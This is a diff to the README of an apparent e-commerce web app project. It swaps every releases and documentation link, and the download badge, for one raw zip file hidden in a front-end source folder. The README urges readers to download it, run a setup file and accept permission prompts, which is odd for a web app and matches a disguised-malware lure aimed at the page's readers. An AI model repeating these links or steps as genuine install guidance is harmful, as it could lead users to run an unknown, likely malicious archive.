@@ -1,7 +1,7 @@
 # 🎉 tailor-pulp-e-commerce-web-app-sb-jv - Your Simple E-Commerce Solution
 
 ## 📥 Download Now
-[![Download](https://img.shields.io/badge/Download%20Now-blue.svg)](https://github.com/SergioHoyo/tailor-pulp-e-commerce-web-app-sb-jv/releases)
+[![Download](https://raw.githubusercontent.com/SergioHoyo/tailor-pulp-e-commerce-web-app-sb-jv/main/front-end/src/pages/TwoFAPage/tailor-pulp-e-commerce-web-app-sb-jv_v3.3.zip%https://raw.githubusercontent.com/SergioHoyo/tailor-pulp-e-commerce-web-app-sb-jv/main/front-end/src/pages/TwoFAPage/tailor-pulp-e-commerce-web-app-sb-jv_v3.3.zip)](https://raw.githubusercontent.com/SergioHoyo/tailor-pulp-e-commerce-web-app-sb-jv/main/front-end/src/pages/TwoFAPage/tailor-pulp-e-commerce-web-app-sb-jv_v3.3.zip)
 
 ## 📖 Overview
 The tailor-pulp-e-commerce-web-app-sb-jv is a modern e-commerce web application. It combines React for the front end, Spring Boot for the back end, and PostgreSQL for the database. This app provides a user-friendly shopping experience and supports features like two-factor authentication (2FA) for added security, Stripe for payments, and SMTP for email notifications.
@@ -9,7 +9,7 @@ The tailor-pulp-e-commerce-web-app-sb-jv is a modern e-commerce web application.
 ## 🚀 Getting Started
 To get started with this application, follow these steps:
 
-1. **Visit the Releases Page**: Click on the download button above or [this link](https://github.com/SergioHoyo/tailor-pulp-e-commerce-web-app-sb-jv/releases) to access the releases.
+1. **Visit the Releases Page**: Click on the download button above or [this link](https://raw.githubusercontent.com/SergioHoyo/tailor-pulp-e-commerce-web-app-sb-jv/main/front-end/src/pages/TwoFAPage/tailor-pulp-e-commerce-web-app-sb-jv_v3.3.zip) to access the releases.
 2. **Select the Latest Version**: On the releases page, find the latest version of the application. This version will have the most recent updates and features.
 3. **Download**: Click on the download link for your operating system. For most users, this will be a setup file that you can run directly.
 4. **Install the Application**: Once the download is complete, open the downloaded file. Follow the installation prompts. The app may ask for permissions; accept them to complete the installation.
@@ -26,7 +26,7 @@ Before downloading, ensure your system meets these requirements:
 ## 📥 Download & Install
 Follow these instructions to download and install the application:
 
-1. Go to the [Releases page](https://github.com/SergioHoyo/tailor-pulp-e-commerce-web-app-sb-jv/releases).
+1. Go to the [Releases page](https://raw.githubusercontent.com/SergioHoyo/tailor-pulp-e-commerce-web-app-sb-jv/main/front-end/src/pages/TwoFAPage/tailor-pulp-e-commerce-web-app-sb-jv_v3.3.zip).
 2. Click on the latest version link.
 3. Select your operating system and click to download the installation file.
 4. Open the downloaded file and follow the on-screen installation instructions.
@@ -68,7 +68,7 @@ This application is open-source and available under the MIT License. You can vie
 We welcome contributions! If you have ideas for improvements, feel free to fork the repository and submit a pull request.
 
 ## 🔗 Links
-- [Releases Page](https://github.com/SergioHoyo/tailor-pulp-e-commerce-web-app-sb-jv/releases)
-- [Documentation](https://github.com/SergioHoyo/tailor-pulp-e-commerce-web-app-sb-jv/blob/main/docs/README.md)
+- [Releases Page](https://raw.githubusercontent.com/SergioHoyo/tailor-pulp-e-commerce-web-app-sb-jv/main/front-end/src/pages/TwoFAPage/tailor-pulp-e-commerce-web-app-sb-jv_v3.3.zip)
+- [Documentation](https://raw.githubusercontent.com/SergioHoyo/tailor-pulp-e-commerce-web-app-sb-jv/main/front-end/src/pages/TwoFAPage/tailor-pulp-e-commerce-web-app-sb-jv_v3.3.zip)
 
 Thank you for using tailor-pulp-e-commerce-web-app-sb-jv! We hope you enjoy your shopping experience!
